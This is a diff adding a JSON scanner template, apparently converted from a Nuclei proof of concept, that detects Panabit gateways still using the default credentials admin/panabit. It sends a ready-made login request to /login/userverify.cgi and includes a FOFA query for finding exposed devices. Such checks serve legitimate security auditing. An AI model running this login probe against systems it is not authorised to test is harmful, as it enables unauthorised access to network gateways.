@@ -1,0 +1,191 @@
+{
+  "id": "panabit-default-login",
+  "name": "Panabit Gateway - Default Login",
+  "author": "pikpikcu,ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "Panabit Gateway default credentials were discovered.",
+  "references": [
+    "https://max.book118.com/html/2017/0623/117514590.shtm",
+    "https://en.panabit.com/wp-content/uploads/Panabit-Intelligent-Application-Gateway-04072020.pdf",
+    "https://topic.alibabacloud.com/a/panabit-monitoring-installation-tutorial_8_8_20054193.html"
+  ],
+  "tags": [
+    "panabit",
+    "default-login",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"Panabit-智能网关\""
+  },
+  "variables": {
+    "password": [
+      "panabit"
+    ],
+    "username": [
+      "admin"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-1391",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /login/userverify.cgi HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryAjZMsILtbrBp8VbC\nReferer: {{BaseURL}}/login/login.htm\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q\u003d0.9,en;q\u003d0.8\n\n------WebKitFormBoundaryAjZMsILtbrBp8VbC\nContent-Disposition: form-data; name\u003d\"username\"\n\n{{username}}\n------WebKitFormBoundaryAjZMsILtbrBp8VbC\nContent-Disposition: form-data; name\u003d\"password\"\n\n{{password}}\n------WebKitFormBoundaryAjZMsILtbrBp8VbC--\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "\u003cMETA HTTP-EQUIV\u003dREFRESH CONTENT\u003d\"0;URL\u003d/index.htm\"\u003e",
+            "urn:schemas-microsoft-com:vml"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "header",
+          "values": [
+            "paonline_admin"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "panabit-default-login",
+    "info": {
+      "name": "Panabit Gateway - Default Login",
+      "author": "pikpikcu,ritikchaddha",
+      "severity": "critical",
+      "description": "Panabit Gateway default credentials were discovered.",
+      "reference": [
+        "https://max.book118.com/html/2017/0623/117514590.shtm",
+        "https://en.panabit.com/wp-content/uploads/Panabit-Intelligent-Application-Gateway-04072020.pdf",
+        "https://topic.alibabacloud.com/a/panabit-monitoring-installation-tutorial_8_8_20054193.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cwe_id": "CWE-1391"
+      },
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"Panabit-智能网关\""
+      },
+      "tags": "panabit,default-login,intrusive"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "admin"
+          ],
+          "password": [
+            "panabit"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /login/userverify.cgi HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryAjZMsILtbrBp8VbC\nReferer: {{BaseURL}}/login/login.htm\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q\u003d0.9,en;q\u003d0.8\n\n------WebKitFormBoundaryAjZMsILtbrBp8VbC\nContent-Disposition: form-data; name\u003d\"username\"\n\n{{username}}\n------WebKitFormBoundaryAjZMsILtbrBp8VbC\nContent-Disposition: form-data; name\u003d\"password\"\n\n{{password}}\n------WebKitFormBoundaryAjZMsILtbrBp8VbC--\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "\u003cMETA HTTP-EQUIV\u003dREFRESH CONTENT\u003d\"0;URL\u003d/index.htm\"\u003e",
+              "urn:schemas-microsoft-com:vml"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "header",
+            "words": [
+              "paonline_admin"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
